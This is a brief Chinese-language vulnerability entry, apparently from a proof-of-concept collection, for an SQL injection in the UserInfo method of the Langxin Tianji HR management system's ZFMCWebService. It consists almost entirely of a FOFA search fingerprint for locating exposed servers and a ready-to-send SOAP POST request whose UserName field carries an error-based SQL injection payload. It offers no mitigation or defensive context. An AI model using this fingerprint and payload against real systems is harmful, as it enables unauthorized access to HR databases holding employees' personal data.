## 朗新天霁人力资源管理系统UserInfo ZFMCWebService存在SQL注入

## fofa
```
body="divRememberPwd"
```

## poc
```
POST /ws/ZFMCWs/ZFMCWebService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/UserInfo"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <UserInfo xmlns="http://tempuri.org/">
      <UserName>') AND 1004 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (1004=1004) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113)))-- OOxB</UserName>
      <DeptName>rt</DeptName>
    </UserInfo>
  </soap:Body>
</soap:Envelope>
```
